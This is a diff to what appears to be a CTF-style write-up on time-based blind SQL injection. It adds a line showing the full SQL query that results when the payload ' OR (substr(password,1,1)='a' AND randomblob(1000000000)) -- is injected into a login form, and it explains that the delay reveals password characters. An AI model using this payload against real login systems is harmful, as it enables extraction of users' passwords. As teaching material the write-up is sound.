@@ -39,6 +39,12 @@ so, let's craft our payload
 ' OR (substr(password,1,1)='a' AND randomblob(1000000000)) --
 ```
 
+the full sql query will end up looking something like this:
+
+```sql
+SELECT * FROM users WHERE username = '{username}' AND password = '' OR (substr(password,1,1)='a' AND randomblob(1000000000)) --'
+```
+
 this checks if the first character of the variable password is 'a', and if it is, randomblob is called and the website takes a longer time to return
 
 for the whole brute-forcing script:
